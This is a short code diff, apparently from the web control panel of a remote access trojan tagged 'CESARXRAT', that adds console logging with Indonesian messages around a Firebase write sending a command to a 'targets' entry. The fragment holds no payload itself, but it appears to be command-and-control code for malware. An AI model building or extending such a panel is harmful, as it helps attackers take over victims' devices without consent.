@@ -347,11 +347,15 @@
                 return;
             }
 
+            console.log('[CESARXRAT] Kirim command:', command);
+
             set(ref(db, 'targets/' + targetId + '/command'), command)
                 .then(() => {
                     document.getElementById('lastCommand').textContent = command;
+                    console.log('[CESARXRAT] Command terkirim');
                 })
                 .catch((error) => {
+                    console.error('[CESARXRAT] Gagal kirim:', error);
                     alert('Gagal kirim: ' + error.message);
                 });
         }
